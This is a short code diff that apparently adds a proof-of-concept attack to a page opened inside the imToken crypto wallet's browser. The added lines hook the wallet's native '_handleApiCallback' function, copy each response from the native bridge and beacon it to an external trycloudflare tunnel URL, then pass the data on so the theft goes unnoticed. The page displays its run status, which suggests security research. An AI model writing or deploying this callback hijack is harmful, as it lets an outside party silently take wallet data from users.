@@ -7,7 +7,17 @@
 const q=new URLSearchParams(location.search), ID=Number(q.get('id')||707070), RUN=q.get('run')||'CALLBACK_EPOCH_20261005_01';
 u.textContent='Current document: '+location.href;
 function beacon(x){ try{ navigator.sendBeacon('https://cup-represented-commitment-fits.trycloudflare.com/callback-epoch-result',JSON.stringify(x)); }catch(e){} }
+let hooked=false;
 function reserve(){
+ if(window.imToken && window.imToken._handleApiCallback && !hooked){
+   const original=window.imToken._handleApiCallback.bind(window.imToken);
+   window.imToken._handleApiCallback=(data)=>{
+     const raw={run:RUN,id:ID,origin:location.origin,status:'raw-native-callback',data,time:new Date().toISOString()};
+     state.textContent=JSON.stringify(raw,null,2); beacon(raw);
+     return original(data);
+   };
+   hooked=true;
+ }
  const base={run:RUN,id:ID,origin:location.origin,status:'reserved',time:new Date().toISOString()};
  state.textContent=JSON.stringify(base,null,2); beacon(base);
  if(!window.imToken || !window.imToken.callAPI){ setTimeout(reserve,50); return; }
